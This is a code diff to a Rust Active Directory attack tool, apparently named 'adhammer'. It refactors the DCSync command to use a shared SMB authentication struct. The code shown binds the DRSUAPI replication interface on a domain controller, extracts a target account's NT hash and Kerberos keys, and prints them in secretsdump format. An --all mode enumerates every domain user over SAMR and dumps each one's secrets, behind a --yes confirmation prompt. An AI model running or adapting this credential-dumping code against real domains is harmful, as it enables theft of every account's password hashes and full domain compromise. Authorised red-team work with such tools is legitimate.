@@ -8,17 +8,8 @@ use clap::Parser;
 
 #[derive(Parser)]
 pub(crate) struct DcsyncArgs {
-    /// DC host or IP
-    #[arg(long)]
-    pub host: String,
-    /// NetBIOS domain, e.g. CORP
-    #[arg(long)]
-    pub domain: String,
-    /// Username (needs replication rights for a real sync)
-    #[arg(long)]
-    pub user: String,
-    #[arg(long)]
-    pub password: String,
+    #[command(flatten)]
+    pub auth: crate::shared_args::SmbAuth,
     /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
     #[arg(long)]
     pub target: Option<String>,
@@ -38,20 +29,21 @@ pub(crate) struct DcsyncArgs {
 
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
 pub(crate) async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
-    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
     use ms_drsr::DrsSession;
 
     if a.all {
         return dcsync_all(&a).await;
     }
-    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
+    let mut sess =
+        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
     match a.target {
         None => {
             let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
             println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
         }
         Some(t) => {
-            let (rid, nt, kerb) = sess.dcsync(&a.domain, &t).await?;
+            let (rid, nt, kerb) = sess.dcsync(&a.auth.domain, &t).await?;
             let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
             // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
             println!(
@@ -76,12 +68,16 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
     use smb2_client::SmbClient;
 
     // 1. enumerate accounts via SAMR-over-SMB.
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let mut smb = SmbClient::connect(&a.auth.host).await?;
+    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
+        .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
+        .await?;
     let pipe = smb.open_pipe("samr").await?;
     let mut samr = SamrClient::bind(&mut smb, pipe).await?;
-    let mut users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
+    let mut users = samr
+        .enumerate_all_users(&format!("\\\\{}", a.auth.host))
+        .await?;
 
     // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
     // every account in the domain; require --yes when we can see the operator's
@@ -92,7 +88,7 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
             "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
              confirm, or use --limit N for a scoped run first.",
             users.len(),
-            a.host
+            a.auth.host
         );
     }
 
@@ -109,10 +105,11 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
     eprintln!("[+] {} accounts scheduled for replication…", users.len());
 
     // 2. DCSync each over one sealed DRSUAPI session.
-    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
+    let mut sess =
+        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
     let (mut ok, mut fail) = (0u32, 0u32);
     for (_rid, name) in &users {
-        match sess.dcsync(&a.domain, name).await {
+        match sess.dcsync(&a.auth.domain, name).await {
             Ok((rid, nt, kerb)) => {
                 let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
                 println!(
